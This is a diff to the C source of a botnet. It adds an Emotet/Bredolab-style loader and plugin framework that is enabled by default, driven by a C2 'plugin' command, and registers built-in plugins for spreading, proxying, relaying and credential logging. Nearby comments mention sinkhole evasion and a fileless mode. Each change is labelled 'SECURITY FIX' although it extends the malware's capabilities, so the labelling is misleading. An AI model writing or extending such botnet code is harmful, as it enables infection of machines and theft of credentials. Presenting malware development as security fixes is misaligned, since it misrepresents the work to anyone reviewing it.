@@ -12,6 +12,7 @@
 #include "deaddrop.h"
 #include "proxy.h"
 #include "relay.h"
+#include "plugin.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -107,6 +108,12 @@ static int init_bot(void) {
      * relay_enabled=1 AND a relay_token is configured (fail-closed). */
     g_bot.relay_enabled = RELAY_DEFAULT_ENABLED;
     g_bot.relay_port = RELAY_DEFAULT_PORT;
+
+    /* SECURITY FIX (#92): Loader/plugin framework (Bredolab/Emotet
+     * split) on by default. The `plugin` C2 command dispatches the
+     * compile-time built-in plugins by name; plugin_enabled=0 disables
+     * the framework. */
+    g_bot.plugin_enabled = PLUGIN_DEFAULT_ENABLED;
     
     /* Set default C2 config.
      * SECURITY FIX (#87): IRC C2 is deprecated — trivially sinkholed and
@@ -286,6 +293,18 @@ int main(void) {
     
     if (init_bot() != 0) {
         return EXIT_FAILURE;
+    }
+
+    /* SECURITY FIX (#92): Loader/plugin bootstrap. Register the
+     * compile-time built-in plugins (spread, proxy, relay, cred-log)
+     * and mark them loaded — existing module behavior is unchanged,
+     * 'load' only flips registry state. Remote plugin fetch is future
+     * work. Skipped entirely when plugin_enabled=0. */
+    if (g_bot.plugin_enabled) {
+        plugin_init();
+        plugin_load_all(&g_bot);
+        log_info("plugin system: %d built-in plugins registered, %d loaded",
+                 plugin_count(), plugin_loaded_count());
     }
     
     /* SECURITY FIX (#84): RAM-only fileless mode first — this may replace
